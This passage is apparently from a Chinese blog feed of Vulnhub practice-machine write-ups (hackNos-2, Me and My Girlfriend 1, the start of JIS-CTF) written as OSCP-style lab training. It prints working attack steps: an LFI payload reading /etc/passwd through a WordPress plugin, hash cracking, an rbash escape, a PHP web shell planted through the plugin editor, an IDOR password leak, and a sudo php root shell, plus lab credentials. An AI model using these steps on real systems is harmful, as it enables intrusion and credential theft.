<code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p><br/><br/><p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p><br/><p>不过，也是学到技能了</p><br/><p>也可以使用如下方式：</p><ul><li>创建一个权限 <code>777</code> 的文件</li><li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li><li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li><li><code>cat</code> 查看</li></ul><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackNos-2</title>
      <link href="/2020/03/10/hackNos-2/"/>
      <url>/2020/03/10/hackNos-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-11-14——2020-02-12-13</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Difficulty : Easy to Intermediate</span><br><span class="line"></span><br><span class="line">Flag : 2 Flag first user And second root</span><br><span class="line"></span><br><span class="line">Learning : Web Application | Enumeration | Password Cracking</span><br><span class="line"></span><br><span class="line">## Changelog - 2019-12-13 ~ v1.1 - 2019-11-29 ~ v1.0</span><br></pre></td></tr></table></figure><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br><span class="line"></span><br><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br/><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br/><p>主机存活扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br/><p>找到目标地址后，扫面服务及操作系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.113</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></pre></td></tr></table></figure><br/><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问 80 端口，略过 Apache 的干扰视线页面，直接扫目录：</p><br/><p><img src="2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-14-08-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>目录访问如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.113/index.html<span class="comment"># Apache 页面，无有价值信息</span></span><br><span class="line"></span><br><span class="line">http://192.168.56.113/tsweb<span class="comment"># 主要目录，WordPress 5.3</span></span><br></pre></td></tr></table></figure><br/><p><code>WordPress</code> 扫描：</p><ul><li><code>Cmseek</code> ：简单扫描</li><li><code>wpscan</code> ：详细扫描</li></ul><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmseek.py -u http://192.168.56.113/tsweb</span><br><span class="line"></span><br><span class="line">wpscan --url http://192.168.56.113/tsweb/</span><br></pre></td></tr></table></figure><br/><p><code>WP</code> 一般就是插件方面的漏洞比较多，<code>searchsploit</code> 也多是插件与主题的漏洞，扫得：</p><ul><li>插件：<code>gracemedia-media-player</code> <code>version 1.0</code> </li><li>用户名：<code>user</code>  </li></ul><br/><p><img src="2020-02-11-14-55-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-17-09-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>试着爆破一下后台 <code>wp-admin</code> ，需要收集一些社工资料，在<code>tsweb</code> 主页有个 <code>about</code> </p><p>得到靶机作者姓名，然后生成字典，Burp 跑爆破，无果……</p><br/><p><img src="2020-02-11-15-42-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-16-47-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>回到上一步，搜索 <code>gracemedia-media-player</code> 插件，有个 <strong>LFI</strong> 漏洞，利用成功，得到一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.113&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;templates&#x2F;files&#x2F;ajax_controller.php?ajaxAction&#x3D;getIds&amp;cfg&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><br/><p><a href="https://cxsecurity.com/issue/WLB-2019030113" target="_blank" rel="noopener"><strong>WordPress GraceMedia Media Player 1.0 Local File Inclusion</strong></a> </p><br/><p><img src="2020-02-11-17-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;:1001:1003::&#x2F;home&#x2F;flag:&#x2F;bin&#x2F;rbash</span><br></pre></td></tr></table></figure><br/><p><code>/etc/passwd</code> 的格式中，第一栏是 <strong>用户名</strong> ，第二栏是 <strong>密码</strong> ，破解 Hash，各大破解网站都试了一遍，除了 <code>cmd5.com</code> 有记录外（付费），其他要么不识别，要么无此条目</p><br/><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>搜了一下 <code>Write-up</code> ，使用 <code>Jhon</code> 破解。得到密码（<code>topsecret</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long 1.hash</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-11-18-06-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>登录 SSH 成功，<code>shell</code> 为 <code>rbash</code> ，一个受限制的 <code>shell</code> ，使用 <code>Vim</code> 绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-11-18-38-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><br/><p>查看 <code>sudo -l</code> 可以干什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># Sorry, user flag may not run sudo on hacknos.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SUID 无有价值程序</span></span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br></pre></td></tr></table></figure><br/><br/><p>想到之前在 <code>/etc/passwd</code> 看到还有一个 <code>rohit</code> 用户，<code>HOME</code> 目录有访问权，无查看权，需要提权</p><p>搜一波相关内容文件，得到 <code>rohit</code> 的密码哈希，丢后台破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'rohit'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-12-11-49-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>继续收集信息，有 WordPress 肯定就有配置文件和 MySQL，进入网站根目录下：</p><p><code>ls -al</code> 显示着唯一同时具备 <code>rw</code> 权限的文件，有猫腻，得到数据库名及一组用户名密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DA_NAME：</span></span><br><span class="line">wordpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_USER：</span></span><br><span class="line">wpuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_PASSWORD：</span></span><br><span class="line">hackNos-2.com</span><br></pre></td></tr></table></figure><br/><br/><p><img src="2020-02-11-18-44-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>登录数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h localhost -u wpuser -p hackNos-2.com</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_users;</span><br></pre></td></tr></table></figure><br/><p>又得到一组用户名与密码（被加密），有密码需要破解，又没钱，只能看 <code>Write-up</code> ，可以改密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 改密码为 user</span><br><span class="line">update wp_users set user_pass&#x3D;md5(&quot;user&quot;) where user_login&#x3D;&#39;user&#39;;</span><br></pre></td></tr></table></figure><br/><hr><br/><p>目前账号信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 低权限用户（rbash），已经无价值了</span></span><br><span class="line">flag：topsecret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mysql 登录</span></span><br><span class="line">wpuser：hackNos-2.com</span><br><span class="line"><span class="comment"># 无法 SSH/Web 后台</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WordPress 用户，可登录 Web后台</span></span><br><span class="line">user：<span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2 改为：user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rohit：<span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure><br/><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><br/><p>后台密码破解中。先去 WordPress 后台看看</p><br/><p>登录 WordPress 后台，试着能不能上传文件，反弹个 <code>shell</code> ，添加的新文章内添加代码被直接显示出来，不被渲染，还有个 <strong>插件编辑</strong> 的，写入 PHP 木马，监听端口，访问木马页面，反弹成功，<code>www-data</code> 用户：</p><br/><p><img src="2020-02-11-19-29-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-19-29-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个交互式 shell</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure><p>一波查看，这个用户似乎也干不了什么大事，权限也不够</p><br/><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>rohit</code> 的密码没跑出来， <code>cmd5.com</code> 收费，若是真实渗透的话，充值一下也无所谓</p><p>这里直接看的 <code>Write-up</code> ，密码明文：<code>!%hack41</code> </p><br/><p>SSH 登录 <code>rohit</code> ，看看可以干什么……ALL。查看 <code>HOME</code> 目录，得到一个 FLAG 和 一个 MD5 Hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User rohit may run the following commands on hacknos:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-12-12-29-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>查看是否还有其他有价值的信息：<code>ls -al</code> ， (o゜▽゜)o☆[BINGO!]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sudo_as_admin_successful</span><br></pre></td></tr></table></figure><p>这个可使用 <code>rohit</code> 的密码切换成为 <code>root</code> 用户，得到 <code>root.txt</code> </p><br/><br/><p><img src="2020-02-12-12-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-12-12-34-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>这里似乎登录 <code>WordPress</code> 后台没什么作用，只是扩大了信息，或许以后会发现他的用处</p><br/><p>这里难的地方就是 Hash 破解了吧，没台好机器，没个好字典，没个好在线工具</p><br/><hr><br/><p>看了一下别人的 <code>Write-up</code> 发现自己忽略了一个提权方式（这就是缺乏经验吧……）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><br/><p>搜索 <code>SUID</code> 的时候，出现的 <code>sudo</code> 和 <code>passwd</code> 可以配合修改 <code>root</code> 的密码</p><p>因为 <code>flag</code> 用户不在 <code>sudoers</code> 中，无法提权，但是 <code>rohit</code> 在。</p><br/><p>这里就是为了记一下， <code>sudo</code> 和 <code>passwd</code> 同时有 <code>SUID</code> 权限，且用户位于 <code>/etc/sudoers</code> 中的时候，可以修改 <code>root</code> 密码</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机——Me and My Girlfirend1</title>
      <link href="/2020/03/03/Me-and-My-Girlfirend1/"/>
      <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-10-22</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line">From : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;me-and-my-girlfriend-1,409&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br><span class="line"></span><br><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>显示主机存活扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p><br><p>排除本机与网关后，找出目标机，扫服务/端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure><br><p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure><br><p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p><br><p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p><br><p><img src="2020-02-10%2018-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p><p><img src="2020-02-10%2020-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p><br><p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p><p>在 Burp 上有更方便的操作方式，后来改之</p><br><hr><br><p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p><br><p>既然是 Web 那便开始扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2018-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2018-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>得到地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure><p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   <span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure><p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure><br><p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2021-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p><p>看源代码，除密码为明文，无其他有价值信息。</p><br><p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure><br><p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p><br><p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: Alice Geulis</span><br><span class="line">username: alice</span><br><span class="line">passwd: 4lic3</span><br></pre></td></tr></table></figure><br><br><p><img src="2020-02-10%2021-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2019-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2019-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br><p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure><p>得到 FLAG2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thanks! Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2022-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机——JIS-CTF</title>
      <link href="/2020/03/03/JIS-CTF/"/>
      <url>/2020/03/03/JIS-CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-10-15</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VM Name: JIS-CTF : VulnUpload</span><br><span class="line"></span><br><span class="line">Difficulty: Beginner</span><br><span class="line"></span><br><span class="line">Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.</span><br><span class="line"></span><br><span class="line">Only working with VirtualBox </span><br><span class="line"></span><br><span class="line">Url : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jis-ctf-vulnupload,228&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>扫描主机存活获取目标地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2013-50-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>排除本机与网关还有两个，扫服务确定目标 IP ： <code>192.168.56.110</code> </p><figure class="highlight 